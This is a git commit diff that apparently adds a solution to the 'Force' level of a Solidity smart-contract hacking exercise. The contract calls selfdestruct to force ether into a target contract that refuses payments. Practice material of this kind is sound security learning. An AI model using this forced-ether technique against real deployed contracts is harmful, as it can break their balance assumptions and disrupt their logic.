4e19475b6df50348093f0ec6b29d436cf6cda70a
Swapneel Bobba <swapneel.bobba123@gmail.com>
2022-05-22 15:43:58 -0400

    AttackingForce solution

--- contracts/3. Force/AttackingForce.sol
+++ contracts/3. Force/AttackingForce.sol
@@ -4,12 +4,16 @@ import "./Force.sol";
 
 contract AttackingForce {
     address public contractAddress;
+    Force private force;
 
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
+        force = Force(contractAddress);
     }
 
     function hackContract() external {
         // Code me!
+        address payable addr = payable(address(force));
+        selfdestruct(addr);
     }
 }
